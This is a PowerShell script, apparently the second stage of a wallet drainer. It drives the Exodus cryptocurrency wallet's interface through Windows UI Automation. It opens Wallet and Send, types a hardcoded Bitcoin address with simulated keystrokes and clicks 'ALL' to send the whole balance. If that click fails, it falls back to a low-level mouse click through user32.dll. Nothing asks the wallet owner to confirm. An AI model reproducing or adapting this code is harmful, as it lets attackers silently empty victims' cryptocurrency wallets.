# === Phase2: Wallet Send Automation ===
Add-Type -AssemblyName UIAutomationClient

function Wait-ForWindow {
    param([string]$pattern,[int]$timeout=20)
    $root=[System.Windows.Automation.AutomationElement]::RootElement
    $end=(Get-Date).AddSeconds($timeout)
    while((Get-Date)-lt $end){
        $wins=$root.FindAll([System.Windows.Automation.TreeScope]::Children,
            [System.Windows.Automation.Condition]::TrueCondition)
        foreach($w in $wins){ if($w.Current.Name -match $pattern){ return $w } }
        Start-Sleep -Milliseconds 300
    }
    return $null
}

function RefreshExodusWindow {
    $root=[System.Windows.Automation.AutomationElement]::RootElement
    $wins=$root.FindAll([System.Windows.Automation.TreeScope]::Children,
        [System.Windows.Automation.Condition]::TrueCondition)
    foreach($w in $wins){
        if($w.Current.Name -match "EXODUS"){ return $w }
    }
    return $null
}

function ClickElementByName {
    param($win,[string]$name)
    if(-not $win){ return $false }
    $cond=New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::NameProperty,$name
    )
    $el=$win.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$cond)
    if($el){
        try {
            $el.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke()
            Write-Host "[INFO] ✅ Clicked '$name'"
            return $true
        } catch { return $false }
    }
    return $false
}

function TypeBTC {
    param([string]$btcAddr)
    $wshell = New-Object -ComObject WScript.Shell
    Start-Sleep -Milliseconds 200
    $wshell.SendKeys($btcAddr)
    Write-Host "[INFO] Typed BTC address: $btcAddr"
}

function ClickAllButton {
    param($mainWin)
    $cond = New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::NameProperty,"ALL"
    )
    $allElement = $mainWin.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$cond)
    if($allElement){
        try {
            $allElement.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke()
            Write-Host "[INFO] ✅ Clicked 'ALL' button!"
        } catch {
            $bounds = $allElement.Current.BoundingRectangle
            $x = [int]($bounds.X + $bounds.Width/2)
            $y = [int]($bounds.Y + $bounds.Height/2)
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class MouseClicker {
                [DllImport("user32.dll",CharSet=CharSet.Auto,CallingConvention=CallingConvention.StdCall)]
                public static extern void mouse_event(long dwFlags,long dx,long dy,long cButtons,long dwExtraInfo);
                private const int MOUSEEVENTF_LEFTDOWN=0x02;
                private const int MOUSEEVENTF_LEFTUP=0x04;
                public static void LeftClick(int x,int y){
                    System.Windows.Forms.Cursor.Position=new System.Drawing.Point(x,y);
                    mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
                }
            }
"@ -ReferencedAssemblies System.Windows.Forms
            [MouseClicker]::LeftClick($x,$y)
            Write-Host "[INFO] ✅ Fallback clicked ALL at $x,$y"
        }
    } else {
        Write-Host "[WARN] Couldn’t find 'ALL' element."
    }
}

function DoWalletSendFlow {
    param($btcAddress)
    # Wait for main UI
    $mainWin = Wait-ForWindow "EXODUS" 15
    if(-not $mainWin){ Write-Host "[ERR] Main window not found."; return }

    # Click Wallet
    Write-Host "[INFO] Clicking Wallet..."
    if(-not (ClickElementByName $mainWin "Wallet")){ Write-Host "[ERR] Wallet not clickable"; return }
    Start-Sleep -Seconds 1

    # Click Send
    Write-Host "[INFO] Clicking Send..."
    if(-not (ClickElementByName $mainWin "Send")){ Write-Host "[ERR] Send not clickable"; return }

    # Type BTC + Click ALL
    TypeBTC $btcAddress
    Start-Sleep -Milliseconds 200
    ClickAllButton $mainWin
}

# === MAIN Phase2 ===
$btcAddress = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
DoWalletSendFlow $btcAddress
